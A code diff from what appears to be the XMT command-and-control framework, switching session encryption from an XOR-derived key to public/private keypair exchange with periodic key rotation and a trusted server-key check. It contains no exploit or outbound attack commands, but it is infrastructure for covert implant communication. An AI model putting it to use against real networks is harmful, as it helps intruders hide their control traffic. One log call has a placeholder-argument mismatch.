@@ -1,4 +1,5 @@
 //go:build !nokeyset
+// +build !nokeyset
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -19,56 +20,102 @@
 package c2
 
 import (
-	"crypto/rand"
-
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
-	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-func (s *Session) keyCheck() {
-	if s.keyNew == nil {
-		return
+func (s *Session) keyCheckRevert() {
+	s.keysNext = nil
+}
+func (s *Session) keyCheckSync() error {
+	if s.keysNext == nil {
+		return nil
 	}
 	if cout.Enabled {
-		s.log.Debug("[%s] Regenerated KeyCrypt key set!", s.ID)
+		s.log.Debug("[%s/Crypt] Syncing KeyPair shared secret.", s.ID)
 	}
-	copy(s.key[:], (*s.keyNew)[:])
-	if generateKeys(&s.key, s.ID); bugtrack.Enabled {
-		bugtrack.Track("c2.(*Session).keyCheck(): %s KeyCrypt details %v.", s.ID, s.key)
+	v := s.keysNext
+	s.keysNext = nil
+	if err := s.keys.FillPrivate(v.Private); err != nil {
+		if cout.Enabled {
+			s.log.Error("[%s/Crypt] KeyPair shared secret sync failed: %s!", s.ID, err)
+		}
+		return err
 	}
-	s.keyNew = nil
-}
-func (s *Session) keyRevert() {
-	s.keyNew = nil
-}
-func (s *Session) doNextKeySwap() bool {
-	if !s.IsClient() || s.keyNew != nil {
-		return false
-	}
-	if util.FastRandN(100) != 0 {
-		return false
+	if v = nil; bugtrack.Enabled {
+		bugtrack.Track("c2.(*Session).keyNextSync(): %s KeyPair shared secret sync completed! [Public: %s, Shared: %v]", s.ID, s.keys.Public, s.keys.Shared())
 	}
 	if cout.Enabled {
-		s.log.Info("[%s] Generating new KeysSet!", s.ID)
+		s.log.Trace("[%s/Crypt] KeyPair shared secret sync completed!", s.ID)
 	}
-	var b data.Key
-	rand.Read(b[:])
-	s.keyNew = &b
-	return true
+	return nil
 }
-func generateKeys(k *data.Key, d device.ID) {
-	for i := 0; i < data.KeySize; i++ {
-		// NOTE(dij): Since the pos index is added here we can't use the "subtle" package.
-		(*k)[i] = ((*k)[i] ^ d[i]) + byte(i)
+func (s *Session) keyNextSync() *com.Packet {
+	if !s.IsClient() || s.keysNext != nil || s.state.Moving() {
+		return nil
+	}
+	if util.FastRandN(130) != 0 {
+		return nil
+	}
+	if cout.Enabled {
+		s.log.Info("[%s/Crypt] Generating new public/private KeyPair for sync.", s.ID)
+	}
+	var (
+		n = &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
+		v data.KeyPair
+	)
+	v.Fill()
+	v.Write(n)
+	if s.keysNext = &v; bugtrack.Enabled {
+		bugtrack.Track("c2.(*Session).keyNextSync(): %s KeyPair details queued for next sync. [Public: %s]", s.ID, v.Public)
+	}
+	return n
+}
+func (s *Session) keySessionGenerate(n *com.Packet) {
+	s.keys.Fill()
+	s.keys.Write(n)
+	if n.Flags |= com.FlagCrypt; cout.Enabled {
+		s.log.Debug("[%s/Crypt] Generated KeyPair details!", s.ID)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.(*Session).keySessionGenerate(): %s KeyPair generated! [Public: %s]", s.ID, s.keys.Public)
 	}
 }
-func (s *Session) generateSessionKey(n *com.Packet) {
-	rand.Read(s.key[:])
-	n.Write(s.key[:])
-	n.Flags |= com.FlagCrypt
-	generateKeys(&s.key, s.ID)
+func (s *Session) keySessionSync(n *com.Packet) error {
+	if s.keys.IsSynced() {
+		if cout.Enabled {
+			s.log.Warning(`[%s/Crypt] Packet "%s" has un-matched KeyPair data, did the server change?`, s.ID)
+		}
+		return nil
+	}
+	if err := s.keys.Read(n); err != nil {
+		if cout.Enabled {
+			s.log.Error(`[%s/Crypt] KeyPair read failed: %s!`, s.ID, err)
+		}
+		return err
+	}
+	// Check server PublicKey here if we have any TrustedKeys set in our profile.
+	if s.p != nil && !s.p.TrustedKey(s.keys.Public) {
+		if cout.Enabled {
+			s.log.Error(`[%s/Crypt] Server PublicKey "%s" is NOT in our Trusted Keys list!`, s.ID, s.keys.Public)
+		}
+		return xerr.Sub("non-trusted server PublicKey", 0x79)
+	}
+	if err := s.keys.Sync(); err != nil {
+		if cout.Enabled {
+			s.log.Error(`[%s/Crypt] KeyPair sync failed: %s!`, s.ID, err)
+		}
+		return err
+	}
+	if cout.Enabled {
+		s.log.Debug(`[%s/Crypt] KeyPair sync with server "%s" completed!`, s.ID, s.keys.Public)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.(*Session).keySessionSync(): %s KeyPair synced! [Public: %s, Shared: %v]", s.ID, s.keys.Public, s.keys.Shared())
+	}
+	return nil
 }
